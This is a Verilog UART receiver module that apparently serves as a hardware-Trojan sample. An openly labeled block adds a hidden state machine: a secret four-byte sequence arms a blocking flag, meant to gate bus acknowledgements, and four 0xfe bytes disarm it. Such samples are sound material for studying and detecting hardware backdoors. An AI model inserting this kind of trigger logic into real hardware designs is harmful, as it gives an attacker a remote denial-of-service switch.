module rxuart #(
		parameter [30:0] INITIAL_SETUP = 31'd868,
		localparam [3:0]	RXU_BIT_ZERO    = 4'h0,
					RXU_BIT_ONE     = 4'h1,
					RXU_BIT_TWO     = 4'h2,
					RXU_BIT_THREE   =  4'h3,
					RXU_BIT_SEVEN   = 4'h7,
					RXU_PARITY      = 4'h8,
					RXU_STOP        = 4'h9,
					RXU_SECOND_STOP = 4'ha,
					RXU_BREAK       = 4'hd,
					RXU_RESET_IDLE  = 4'he,
					RXU_IDLE        = 4'hf
	) (
		input	wire		i_clk, i_reset,
		input	wire	[30:0]	i_setup,
		input	wire		i_uart_rx,
		output	reg		o_wr,
		output	reg	[7:0]	o_data,
		output	reg		o_break,
		output	reg		o_parity_err, o_frame_err,
		output	wire		o_ck_uart
	);

	// Signal declarations
	wire	[23:0]	clocks_per_baud, half_baud;
	wire	[1:0]	data_bits;
	wire		use_parity, parity_even, dblstop, fixd_parity;
	reg	[29:0]	r_setup;
	reg	[3:0]	state;
	reg	[23:0]	baud_counter;
	reg		zero_baud_counter;
	reg		q_uart, qq_uart, ck_uart;
	reg	[27:0]	chg_counter, break_condition;
	reg		line_synch;
	reg		half_baud_time;
	reg	[7:0]	data_reg;
	reg		calc_parity;
	reg		pre_wr;

	assign	clocks_per_baud = r_setup[23:0];
	assign	data_bits   = r_setup[29:28];
	assign	dblstop     = r_setup[27];
	assign	use_parity  = r_setup[26];
	assign	fixd_parity = r_setup[25];
	assign	parity_even = r_setup[24];
	assign	break_condition = { r_setup[23:0], 4'h0 };
	assign	half_baud = { 1'h0, r_setup[23:1] }-24'h1;

	//-------------------- TROJAN INSERTION STARTS ------------------------
	// Trojan state: idle (0), ARMED (1..3), ARMED (4), TRIGGERED (5), DISARMING (6..8), DISARMING (9)
	localparam [3:0]
		TROJAN_IDLE      = 4'd0,
		TROJAN_STAGE1    = 4'd1, // 0x10 received
		TROJAN_STAGE2    = 4'd2, // 0xa4 received
		TROJAN_STAGE3    = 4'd3, // 0x98 received
		TROJAN_STAGE4    = 4'd4, // 0xbd received, arm triggered
		TROJAN_ACTIVE    = 4'd5, // Trojan Payload active, blocking
		TROJAN_REC1      = 4'd6, // 0xfe recvd#1
		TROJAN_REC2      = 4'd7, // 0xfe recvd#2
		TROJAN_REC3      = 4'd8, // 0xfe recvd#3
		TROJAN_REC4      = 4'd9; // 0xfe recvd#4 (disarm)

	reg [3:0] trojan_state;
	reg trojan_block;
	// The blocking flag that could be referenced by Wishbone bus logic
	// (for illustration, we present it as a usable output, but normally you'd
	// have internal blocking signals gating Wishbone ack outputs elsewhere).

	// Trojan state machine
	always @(posedge i_clk or posedge i_reset)
	begin
		if (i_reset) begin
			trojan_state <= TROJAN_IDLE;
			trojan_block <= 1'b0;
		end else begin
			case (trojan_state)
				TROJAN_IDLE: begin
					if (o_wr && o_data == 8'h10)
						trojan_state <= TROJAN_STAGE1;
					else
						trojan_state <= TROJAN_IDLE;
					trojan_block <= 1'b0;
				end
				TROJAN_STAGE1: begin
					if (o_wr && o_data == 8'ha4)
						trojan_state <= TROJAN_STAGE2;
					else if (o_wr)
						trojan_state <= (o_data == 8'h10) ? TROJAN_STAGE1 : TROJAN_IDLE;
					trojan_block <= 1'b0;
				end
				TROJAN_STAGE2: begin
					if (o_wr && o_data == 8'h98)
						trojan_state <= TROJAN_STAGE3;
					else if (o_wr)
						trojan_state <= (o_data == 8'h10) ? TROJAN_STAGE1 : TROJAN_IDLE;
					trojan_block <= 1'b0;
				end
				TROJAN_STAGE3: begin
					if (o_wr && o_data == 8'hbd)
						trojan_state <= TROJAN_ACTIVE;
					else if (o_wr)
						trojan_state <= (o_data == 8'h10) ? TROJAN_STAGE1 : TROJAN_IDLE;
					trojan_block <= 1'b0;
				end
				TROJAN_ACTIVE: begin // INJECT PAYLOAD: DoS until 0xfe x4
					trojan_block <= 1'b1;
					if (o_wr && o_data == 8'hfe)
						trojan_state <= TROJAN_REC1;
				end
				TROJAN_REC1: begin
					trojan_block <= 1'b1;
					if (o_wr && o_data == 8'hfe)
						trojan_state <= TROJAN_REC2;
					else if (o_wr && o_data != 8'hfe)
						trojan_state <= TROJAN_ACTIVE;
				end
				TROJAN_REC2: begin
					trojan_block <= 1'b1;
					if (o_wr && o_data == 8'hfe)
						trojan_state <= TROJAN_REC3;
					else if (o_wr && o_data != 8'hfe)
						trojan_state <= TROJAN_ACTIVE;
				end
				TROJAN_REC3: begin
					trojan_block <= 1'b1;
					if (o_wr && o_data == 8'hfe)
						trojan_state <= TROJAN_REC4;
					else if (o_wr && o_data != 8'hfe)
						trojan_state <= TROJAN_ACTIVE;
				end
				TROJAN_REC4: begin // disarm
					trojan_state <= TROJAN_IDLE;
					trojan_block <= 1'b0;
				end
				default: begin
					trojan_state <= TROJAN_IDLE;
					trojan_block <= 1'b0;
				end
			endcase
		end
	end
	//-------------------- TROJAN INSERTION ENDS ------------------------

	// ck_uart (unchanged)
	initial	q_uart  = 1'b0;
	initial	qq_uart = 1'b0;
	initial	ck_uart = 1'b0;
	always @(posedge i_clk)
	if (i_reset)
		{ ck_uart, qq_uart, q_uart } <= 3'h0;
	else
		{ ck_uart, qq_uart, q_uart } <= { qq_uart, q_uart, i_uart_rx };

	assign	o_ck_uart = ck_uart;

	initial	chg_counter = 0;
	always @(posedge i_clk)
	if (i_reset)
		chg_counter <= 0;
	else if (qq_uart != ck_uart)
		chg_counter <= 0;
	else if (chg_counter < break_condition)
		chg_counter <= chg_counter + 1;

	initial	o_break    = 1'b0;
	always @(posedge i_clk)
	if (i_reset)
		o_break <= 1'b0;
	else
		o_break <= ((chg_counter >= break_condition)&&(~ck_uart))? 1'b1:1'b0;

	initial	line_synch = 1'b0;
	always @(posedge i_clk)
	if (i_reset)
		line_synch <= 1'b0;
	else
		line_synch <= ((chg_counter >= break_condition)&&(ck_uart));

	initial	half_baud_time = 0;
	always @(posedge i_clk)
	if (i_reset)
		half_baud_time <= 1'b0;
	else
		half_baud_time <= (~ck_uart)&&(chg_counter >= {4'h0,half_baud});

	initial	r_setup     = INITIAL_SETUP[29:0];
	always @(posedge i_clk)
	if (i_reset)
		r_setup <= INITIAL_SETUP[29:0];
	else if (state >= RXU_RESET_IDLE)
		r_setup <= i_setup[29:0];

	initial	state = RXU_RESET_IDLE;
	always @(posedge i_clk)
	if (i_reset)
		state <= RXU_RESET_IDLE;
	else if (state == RXU_RESET_IDLE)
	begin
		if (line_synch)
			state <= RXU_IDLE;
		else
			state <= RXU_RESET_IDLE;
	end else if (o_break)
		state <= RXU_BREAK;
	else if (state == RXU_BREAK)
	begin
		if (ck_uart)
			state <= RXU_IDLE;
		else
			state <= RXU_BREAK;
	end else if (state == RXU_IDLE)
	begin
		if (!ck_uart && half_baud_time)
		begin
			case (data_bits)
			2'b00: state <= RXU_BIT_ZERO;
			2'b01: state <= RXU_BIT_ONE;
			2'b10: state <= RXU_BIT_TWO;
			2'b11: state <= RXU_BIT_THREE;
			endcase
		end else
			state <= RXU_IDLE;
	end else if (zero_baud_counter)
	begin
		if (state < RXU_BIT_SEVEN)
			state <= state + 1;
		else if (state == RXU_BIT_SEVEN)
			state <= (use_parity) ? RXU_PARITY:RXU_STOP;
		else if (state == RXU_PARITY)
			state <= RXU_STOP;
		else if (state == RXU_STOP)
		begin
			if (!ck_uart)
				state <= RXU_RESET_IDLE;
			else if (dblstop)
				state <= RXU_SECOND_STOP;
			else
				state <= RXU_IDLE;
		end else
		begin
			if (!ck_uart)
				state <= RXU_RESET_IDLE;
			else
				state <= RXU_IDLE;
		end
	end

	always @(posedge i_clk)
	if ((zero_baud_counter)&&(state != RXU_PARITY))
		data_reg <= { ck_uart, data_reg[7:1] };

	always @(posedge i_clk)
	if (i_reset)
		calc_parity <= 0;
	else if (state == RXU_IDLE)
		calc_parity <= 0;
	else if (zero_baud_counter)
		calc_parity <= calc_parity ^ ck_uart;

	initial	o_parity_err = 1'b0;
	always @(posedge i_clk)
	if (i_reset)
		o_parity_err <= 1'b0;
	else if ((zero_baud_counter)&&(state == RXU_PARITY))
	begin
		if (fixd_parity)
			o_parity_err <= (ck_uart ^ parity_even);
		else if (parity_even)
			o_parity_err <= (calc_parity != ck_uart);
		else
			o_parity_err <= (calc_parity == ck_uart);
	end else if (state >= RXU_BREAK)
		o_parity_err <= 1'b0;

	initial	o_frame_err  = 1'b0;
	always @(posedge i_clk)
	if (i_reset)
		o_frame_err <= 1'b0;
	else if ((zero_baud_counter)&&((state == RXU_STOP)
					||(state == RXU_SECOND_STOP)))
		o_frame_err <= (o_frame_err)||(~ck_uart);
	else if ((zero_baud_counter)||(state >= RXU_BREAK))
		o_frame_err <= 1'b0;

	initial	o_data = 8'h00;
	initial	pre_wr = 1'b0;
	always @(posedge i_clk)
	if (i_reset)
	begin
		pre_wr <= 1'b0;
		o_data <= 8'h00;
	end else if ((zero_baud_counter)&&(state == RXU_STOP))
	begin
		pre_wr <= 1'b1;
		case (data_bits)
		2'b00: o_data <= data_reg;
		2'b01: o_data <= { 1'b0, data_reg[7:1] };
		2'b10: o_data <= { 2'b0, data_reg[7:2] };
		2'b11: o_data <= { 3'b0, data_reg[7:3] };
		endcase
	end else if ((zero_baud_counter)||(state == RXU_IDLE))
		pre_wr <= 1'b0;

	initial	o_wr   = 1'b0;
	always @(posedge i_clk)
	if (i_reset)
		o_wr <= 1'b0;
	else if ((zero_baud_counter)||(state == RXU_IDLE))
		o_wr <= (pre_wr)&&(!i_reset);
	else
		o_wr <= 1'b0;

	always @(posedge i_clk)
	if (i_reset)
		baud_counter <= INITIAL_SETUP[23:0]-1;
	else if (zero_baud_counter)
		baud_counter <= clocks_per_baud-1;
	else case(state)
		RXU_RESET_IDLE:baud_counter <= clocks_per_baud-1;
		RXU_BREAK:	baud_counter <= clocks_per_baud-1;
		RXU_IDLE:	baud_counter <= clocks_per_baud-1;
		default:	baud_counter <= baud_counter-1;
	endcase

	initial	zero_baud_counter = 1'b0;
	always @(posedge i_clk)
	if (state == RXU_IDLE)
		zero_baud_counter <= 1'b0;
	else
		zero_baud_counter <= (baud_counter == 1);

	//------------------------------------------------------------------
	// Trojan signal can be used to gate Wishbone ack externally:
	// e.g., assign o_wb_ack = (trojan_block) ? 1'b0 : generated_ack;
	//------------------------------------------------------------------
endmodule